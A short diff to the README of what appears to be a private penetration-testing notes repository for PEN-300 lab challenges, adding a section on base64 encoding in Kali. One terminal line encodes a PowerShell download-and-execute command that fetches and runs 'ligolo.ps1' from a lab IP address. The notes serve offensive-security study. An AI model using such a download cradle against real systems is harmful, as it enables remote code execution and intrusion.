@@ -4,6 +4,15 @@ This project was started as a means to better organize each repo along with a ho
 
 As such, this repo is still in private and will not be published as some of the exploits are challenge or exercise specific. 
 
+# Kali - must know stuff
+```bash
+# Base64 encoding via Kali
+echo "string" | base64 -w0 # base64 encoding, -w0 is nowrap syntax
+
+┌──(kali㉿kali)-[/mnt/…/SharedVMFolder/Backups/PEN-300/Challenge04]
+└─$ echo "iex(iwr http://192.168.45.227/ligolo.ps1 -UseBasicParsing)" | base64 -w0
+```
+
 # From Kali - Enumeration
 ## nmap
 ```bash
